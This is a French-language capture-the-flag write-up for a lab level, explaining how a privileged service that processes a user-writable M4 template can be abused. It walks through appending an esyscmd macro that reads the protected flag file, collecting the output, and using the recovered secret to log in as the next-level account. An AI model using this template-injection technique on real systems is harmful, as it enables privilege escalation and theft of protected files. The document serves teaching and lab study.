# Level04 — Comprendre l’injection de macro M4

## Objectif

Comprendre qu’un moteur de génération de texte peut aussi interpréter des instructions capables d’exécuter des commandes. Un modèle modifiable devient dangereux lorsqu’un service privilégié le traite comme du code.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
In the beginning was the Word.
```

L’indice oriente vers le traitement de texte. L’identification de M4 repose ensuite sur la recherche des services et des fichiers liés au niveau ; la sortie de cette recherche reste à conserver sur la VM.

## 2. Vérifier le service et les permissions

```bash
id
systemctl cat babel.service
ls -l /var/lib/babel/templates/template.m4
```

Ces commandes permettent de vérifier que :

- le modèle `template.m4` est modifiable par `level04` ;
- le service Babel traite ce modèle ;
- le service s’exécute sous l’identité `flag04`.

La faille repose donc sur la relation suivante :

```text
template.m4 modifiable par level04
              │
              ▼
       M4 lancé par le service
              │
              ▼
   commande exécutée comme flag04
              │
              ▼
    résultat écrit dans output.conf
```

## 3. Comprendre M4

M4 est un processeur de macros. Une macro peut transformer du texte ou déclencher une opération prédéfinie.

Exemple inoffensif :

```bash
echo "define(\`bonjour', \`Salut')bonjour" | m4
```

Résultat :

```text
Salut
```

La macro `bonjour` a été remplacée par `Salut`. Le point important du niveau est que GNU M4 fournit aussi `esyscmd`, une macro qui exécute une commande shell et insère sa sortie dans le texte généré.

## 4. Comprendre le payload

Le fichier [payload.m4](payload.m4) contient une seule instruction :

```m4
esyscmd(`cat /home/flag04/.flag')
```

| Élément | Rôle |
| --- | --- |
| `esyscmd` | Exécuter une commande shell et récupérer sa sortie. |
| `cat` | Lire le contenu d’un fichier. |
| `/home/flag04/.flag` | Fichier que le service peut lire grâce aux droits de `flag04`. |
| Accent grave et apostrophe | Délimiter un argument avec la syntaxe de citation par défaut de M4. |

Le résultat de `cat` est inséré dans le document généré par M4, puis écrit dans `/var/lib/babel/output.conf`.

## 5. Modifier le modèle

Ajouter le payload à la fin du modèle :

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`cat /home/flag04/.flag')
EOF
```

La différence entre les opérateurs est importante :

- `>` remplace le contenu du fichier ;
- `>>` ajoute du contenu à la fin.

On utilise `>>` afin de conserver les instructions originales du modèle. Les apostrophes autour de `EOF` empêchent également le shell d’interpréter le contenu du payload.

## 6. Lire le résultat généré

Après le passage du service, afficher les dernières lignes de la sortie :

```bash
tail -n 3 /var/lib/babel/output.conf
```

Le secret apparaît dans le texte généré :

```text
ne2searoevaevoem4ov4ar8ap
```

`tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.

## 7. Passer à `level05`

```bash
su - level05
```

Saisir le secret comme mot de passe, puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level05`. Le passage au compte suivant a réussi avec la valeur récupérée, également conservée dans `level04/flag`.

## Pourquoi cette méthode fonctionne

Le service interprète comme du code un modèle contrôlé par un utilisateur moins privilégié. Lorsque Babel traite `template.m4`, `esyscmd` s’exécute avec les droits de `flag04`, et non ceux de `level04`.

Les niveaux 03 et 04 exploitent la même erreur de confiance : un service privilégié charge un fichier modifiable par un autre utilisateur. Seuls le langage interprété et le mécanisme de sortie changent.

## À expliquer à l’évaluation

> J’ai vérifié que `level04` pouvait modifier un modèle M4 traité par un service exécuté sous `flag04`. J’ai ajouté une macro `esyscmd` qui lit le flag, puis récupéré sa sortie dans le fichier généré. J’ai ensuite validé le secret avec `level05`.

## Traçabilité à conserver

Conserver les sorties de `id`, `systemctl cat`, `ls -l`, `tail` et `id -un`. La recherche initiale qui a permis d’identifier Babel reste également à documenter sur la VM.
